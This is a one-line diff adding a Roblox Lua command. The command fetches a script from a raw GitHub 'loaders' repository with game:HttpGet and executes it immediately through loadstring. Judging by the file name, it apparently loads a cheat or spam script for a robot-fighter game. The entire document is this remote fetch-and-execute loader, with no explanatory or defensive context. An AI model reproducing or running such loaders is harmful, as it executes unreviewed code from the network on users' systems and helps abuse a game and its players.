@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/create-a-robot-fighter-spam7-9n43s596odnm25.lua"))()
